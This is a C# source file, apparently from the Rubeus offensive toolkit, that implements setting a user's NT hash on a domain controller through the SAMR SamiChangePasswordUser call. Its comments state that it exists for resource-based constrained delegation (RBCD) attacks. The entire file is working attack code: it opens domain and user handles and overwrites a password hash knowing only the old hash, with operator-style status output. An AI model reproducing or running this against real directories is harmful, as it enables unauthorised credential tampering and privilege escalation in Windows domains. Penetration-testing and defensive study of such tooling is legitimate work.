using System;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Security.Principal;

namespace Rubeus
{
    /// <summary>
    /// Implements NTLM hashes change via SamrChangePasswordUser (Opnum 38) API call
    /// The code is taken from SetNTLM.ps1 by @vletoux: https://github.com/vletoux/NTLMInjector/blob/master/SetNTLM.ps1
    /// The initial purpose of this class is to be used in RBCD attacks using normal user accounts
    /// Reference: https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html (by @tiraniddo)
    /// </summary>
    public class Samr
    {
        public static byte[] NewHashBytes { get; set; }

        [SecurityPermission(SecurityAction.Demand)]
        public static int SetNTLM(string server, string userName, byte[] hashBytes, byte[] newHashBytes)
        {
            IntPtr samHandle = IntPtr.Zero;
            IntPtr domainHandle = IntPtr.Zero;
            IntPtr userHandle = IntPtr.Zero;
            UNICODE_STRING uServer = new UNICODE_STRING();
            int result = 0;

            try
            {
                uServer.Initialize(server);

                Console.WriteLine("[*] [MS-SAMR] Obtaining handle to domain controller object");

                result = SamConnect(ref uServer, out samHandle, MAXIMUM_ALLOWED, false);
                if (result != 0)
                {
                    Console.WriteLine("[X] [MS-SAMR] SamrConnect error: {0}", result.ToString("x"));
                    return result;
                }

                NTAccount account = new NTAccount(userName);
                SecurityIdentifier sid = (SecurityIdentifier)account.Translate(typeof(SecurityIdentifier));
                byte[] sidBytes = new byte[SecurityIdentifier.MaxBinaryLength];
                sid.AccountDomainSid.GetBinaryForm(sidBytes, 0);

                Console.WriteLine("[*] [MS-SAMR] Obtaining handle to domain object");

                result = SamOpenDomain(samHandle, MAXIMUM_ALLOWED, sidBytes, out domainHandle);
                if (result != 0)
                {
                    Console.WriteLine("[X] [MS-SAMR] SamrOpenDomain error: {0}", result.ToString("x"));
                    return result;
                }

                int rid = GetRidFromSid(sid);

                Console.WriteLine("[*] [MS-SAMR] Obtaining handle to user object '{0}' with RID '{1}'", userName, rid);

                result = SamOpenUser(domainHandle, MAXIMUM_ALLOWED, rid, out userHandle);
                if (result != 0)
                {
                    Console.WriteLine("[X] [MS-SAMR] SamrOpenUser error: {0}", result.ToString("x"));
                    return result;
                }

                byte[] oldLm = new byte[16];
                byte[] newLm = new byte[16];

                Console.WriteLine("[*] [MS-SAMR] Changing NT hash of user '{0}' to '{1}'", userName, Helpers.ByteArrayToString(newHashBytes));

                result = SamiChangePasswordUser(userHandle, false, oldLm, newLm, true, hashBytes, newHashBytes);
                if (result != 0)
                {
                    Console.WriteLine("[X] [MS-SAMR] SamiChangePasswordUser error: {0}", result.ToString("x"));
                    return result;
                }
            }
            finally
            {
                if (userHandle != IntPtr.Zero)
                    SamCloseHandle(userHandle);

                if (domainHandle != IntPtr.Zero)
                    SamCloseHandle(domainHandle);

                if (samHandle != IntPtr.Zero)
                    SamCloseHandle(samHandle);

                uServer.Dispose();
            }

            return 0;
        }

        static int GetRidFromSid(SecurityIdentifier sid)
        {
            string sidString = sid.Value;
            int pos = sidString.LastIndexOf('-');
            string rid = sidString.Substring(pos + 1);
            return int.Parse(rid);
        }

        const int MAXIMUM_ALLOWED = 0x02000000;

        [StructLayout(LayoutKind.Sequential)]
        struct UNICODE_STRING : IDisposable
        {
            public ushort length;
            public ushort maxLength;
            private IntPtr buffer;

            [SecurityPermission(SecurityAction.LinkDemand)]
            public void Initialize(string s)
            {
                length = (ushort)(s.Length * 2);
                maxLength = (ushort)(length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                if (buffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(buffer);

                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                if (length == 0)
                    return String.Empty;

                return Marshal.PtrToStringUni(buffer, length / 2);
            }
        }

        [DllImport("samlib.dll")]
        static extern int SamConnect(
            ref UNICODE_STRING ServerName,
            out IntPtr ServerHandle,
            int DesiredAccess,
            bool Reserved);

        [DllImport("samlib.dll")]
        static extern int SamOpenDomain(
            IntPtr ServerHandle,
            int DesiredAccess,
            byte[] DomainId,
            out IntPtr DomainHandle);

        [DllImport("samlib.dll")]
        static extern int SamOpenUser(
            IntPtr DomainHandle,
            int DesiredAccess,
            int UserId,
            out IntPtr UserHandle);

        // https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476
        [DllImport("samlib.dll")]
        static extern int SamiChangePasswordUser(
            IntPtr UserHandle,
            bool LmPresent,
            byte[] OldLmEncryptedWithNewLm,
            byte[] NewLmEncryptedWithOldLm,
            bool NtPresent,
            byte[] OldNtEncryptedWithNewNt,
            byte[] NewNtEncryptedWithOldNt);
         /* bool NtCrossEncryptionPresent,
          * byte[] NewNtEncryptedWithNewLm,
          * bool LmCrossEncryptionPresent,
          * byte[] NewLmEncryptedWithNewNt); */

        [DllImport("samlib.dll")]
        static extern int SamCloseHandle(IntPtr SamHandle);
    }
}
